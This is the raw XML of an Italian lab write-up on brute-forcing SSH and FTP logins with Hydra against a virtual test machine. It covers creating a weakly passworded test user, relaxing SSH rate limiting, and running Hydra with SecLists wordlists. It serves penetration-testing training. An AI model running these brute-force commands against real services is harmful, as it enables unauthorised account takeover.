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0415F564B11.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000002E400000036DE9656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fo:font-size="20pt" fo:font-weight="bold" officeooo:rsid="0012f85e" officeooo:paragraph-rsid="0012f85e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fo:font-weight="normal" officeooo:rsid="0012f85e" officeooo:paragraph-rsid="0012f85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20pt" fo:font-weight="bold" officeooo:rsid="0013f27e" officeooo:paragraph-rsid="0013f27e" style:font-size-asian="20pt" style:font-weight-asian="bold" style:font-size-complex="20pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="0013f27e" officeooo:paragraph-rsid="0013f27e" style:font-size-asian="10.5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font-weight="bold" officeooo:rsid="0013f27e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0013f27e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0013f27e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fo:font-size="20pt" fo:font-weight="bold" officeooo:rsid="00158427" officeooo:paragraph-rsid="00158427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top="0.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0017ff15" officeooo:paragraph-rsid="0017ff1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.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00158427" officeooo:paragraph-rsid="00158427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paragraph-rsid="000ef991"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00158427" officeooo:paragraph-rsid="00158427"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0011f510"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0011f510" officeooo:paragraph-rsid="0011f510"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00158427" officeooo:paragraph-rsid="00158427" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0016c047"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0016c047" officeooo:paragraph-rsid="0016c047"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0017ff15" officeooo:paragraph-rsid="0017ff15"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0017ff15"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-size="20pt" officeooo:rsid="0017ff15" officeooo:paragraph-rsid="0017ff15" style:font-size-asian="17.5pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0017ff15" officeooo:paragraph-rsid="0017ff15" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="001823ce" officeooo:paragraph-rsid="001823ce" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="1.251cm" fo:margin-top="0.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="12pt" officeooo:rsid="001823ce" officeooo:paragraph-rsid="001823ce" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0018d760" officeooo:paragraph-rsid="0018d760" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="1.251cm" fo:margin-top="0.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0018d760" officeooo:paragraph-rsid="0018d760" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="001ab48a" officeooo:paragraph-rsid="001ab48a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="1.251cm" fo:margin-top="0.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0018d760" officeooo:paragraph-rsid="001ab48a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-size="12pt" officeooo:rsid="001ab48a" officeooo:paragraph-rsid="001ab48a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="1.251cm" fo:margin-top="0.201cm" fo:margin-bottom="0.201cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0018d760" officeooo:paragraph-rsid="001ab48a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3ce" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="001823ce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6c047"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="0017ff15"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="001ab4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nicha di Brute Force su Servizi SSH e FTP </text:p>
      <text:p text:style-name="P2">Questa esercitazione pratica introduce l'utilizzo di Hydra, un potente strumento di brute force, per “testare” la sicurezza dei servizi SSH e FTP in un ambiente controllato di laboratorio. </text:p>
      <text:p text:style-name="P3">Il laboratorio</text:p>
      <text:p text:style-name="P4">Il laboratorio è configurato con tre macchine virtuali che simulano un ambiente di rete per test di sicurezza e penetration testing:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Macchina Attaccante</text:span></text:span><text:span text:style-name="T1">: Sistema operativo Kali Linux, utilizzato per eseguire test di penetrazione e simulare attacchi informatici. </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Macchina </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">T</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">arget</text:span></text:span><text:span text:style-name="T1">: Sistema operativo Kali Linux, configurato per fungere da bersaglio per i test di sicurezza. </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Router/Modem</text:span></text:span><text:span text:style-name="T1">: Sistema operativo pfSense, che fornisce funzionalità di routing, firewall e permette la gestione del traffico di rete tra le macchine virtuali. </text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7">Questa configurazione permette di simulare scenari di attacco in un ambiente controllato e isolato.</text:p>
      <text:p text:style-name="P8">Configurazione Servizi nella Macchina <text:span text:style-name="T3">T</text:span>arget </text:p>
      <text:p text:style-name="P9">per prima il servizio ssh</text:p>
      <text:p text:style-name="P10">Dopo aver completato la creazione della macchina virtuale, è necessario procedere con la configurazione dell'utente come da istruzioni,</text:p>
      <text:p text:style-name="P11">sudo useradd test_user </text:p>
      <text:p text:style-name="P12">in questo modo creeremo un nuovo utente chiamato <text:span text:style-name="T4">test_user</text:span> </text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P13">sudo chsh test_user -s /bin/bash</text:p>
      <text:p text:style-name="P12">accederemo alla bash dello stesso utente</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P14">sudo passwd test_user</text:p>
      <text:p text:style-name="P12">e cosi potremo assegnare all’utente la password <text:span text:style-name="T4">testpass</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">sudo nano /etc/ssh/shhd_config</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T5">in etc/ssg troveremo il file di configurazione del servizio ssh (in questo caso ho aggiunto PerSourcePenaltyExemptList 192.168.0.0/16 che permette di escludere per tutte le reti private </text:span><text:span text:style-name="T6">le</text:span><text:span text:style-name="T5"> limitazioni nelle caso di </text:span>tentativi ripetuti di connessione <text:span text:style-name="T5">)</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P14">sudo service ssh start</text:p>
      <text:p text:style-name="P18">e in ultimo questo per avviare il servizio </text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P9">per secondo il servizio tcp</text:p>
      <text:p text:style-name="Standard">sudo apt-get install vsftpd </text:p>
      <text:p text:style-name="Standard">serve per installare un server FTP (File Transfer Protocol) </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P14">vim vsftpd.conf</text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T5">in etc/ <text:s/>troveremo il file di configurazione del servizio </text:span><text:span text:style-name="T6">ftp </text:span><text:span text:style-name="T5">(in questo caso </text:span><text:span text:style-name="T6">non ho trovato modifiche senzate da aplicare al file di configurazione)</text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P14">sudo service vsftpd start</text:p>
      <text:p text:style-name="P18">e in ultimo questo per avviare il servizio </text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P20"><text:soft-page-break/>passando all’attacante</text:p>
      <text:p text:style-name="P21">Inizieremo con un'analisi metodica della rete del sistema target per identificare porte aperte e servizi attivi <text:span text:style-name="T3">tramite nmap o nessus</text:span>. A partire da quale momento sarà possibile iniziare le procedure necessarie per ottenere i privilegi di root</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P22">in questo caso specifico essendo che conosciamo in nome utente e la password testiamo che i servizi sia effettivamente attivi <text:s/></text:p>
      <text:p text:style-name="P23">ssh <text:a xlink:type="simple" xlink:href="mailto:test_user@192.168.50.151" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">test_user@192.168.50.151</text:a></text:p>
      <text:p text:style-name="P23">ftp 192.168.50.151 <text:s/></text:p>
      <text:p text:style-name="P24">cosi potremmo verificato l’effettiva funzionalità dei servizi </text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">ora possiamo sperimentare le funzionalità dell'applicazione HYDRA </text:p>
      <text:p text:style-name="P25">hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://192.168.50.151 -V -t8</text:p>
      <text:p text:style-name="P26">Con questo comando, dopo tanto tempo, potremo effettivamente trovare nome e password, ma testare più di 650.000 combinazioni non mi sembrava il caso. Infatti, per quanto non sia realistico, ho sperimentato direttamente includendo il nome come informazione acquisita in altro modo. </text:p>
      <text:p text:style-name="P27">hydra -<text:span text:style-name="T7">l test_user</text:span> -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://192.168.50.151 -V -t8</text:p>
      <text:p text:style-name="P28">in questo modo troverò riscontro “solo”<draw:frame draw:style-name="fr1" draw:name="Immagine1" text:anchor-type="char" svg:x="0cm" svg:y="1cm" svg:width="17cm" svg:height="1.328cm" draw:z-index="0"><draw:image xlink:href="Pictures/100000010000033F000000415F564B11.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame> 5208 tentativi <text:s/></text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">allo stesso modo ho provato con il servizio ftp con il comando </text:p>
      <text:p text:style-name="P29">hydra -<text:span text:style-name="T7">l test_user</text:span> -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 192.168.50.151 <text:span text:style-name="T7">ftp </text:span>-V -t8</text:p>
      <text:p text:style-name="P28">anche in questo caso dopo un po' di tempo avremo riscontro</text:p>
      <text:p text:style-name="P28"><draw:frame draw:style-name="fr2" draw:name="Immagine2" text:anchor-type="char" svg:width="17cm" svg:height="1.238cm" draw:z-index="1"><draw:image xlink:href="Pictures/10000001000002E400000036DE9656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20:13:38.359076800</meta:creation-date>
    <dc:date>2025-05-11T23:19:47.935094100</dc:date>
    <meta:editing-duration>PT11M7S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="2" meta:object-count="0" meta:page-count="2" meta:paragraph-count="42" meta:word-count="474" meta:character-count="3443" meta:non-whitespace-character-count="2991"/>
    <meta:generator>LibreOffice/25.2.2.2$Windows_X86_64 LibreOffice_project/7370d4be9e3cf6031a51beef54ff3bda878e3fac</meta:generator>
  </office:meta>
</office:document-meta>
</file>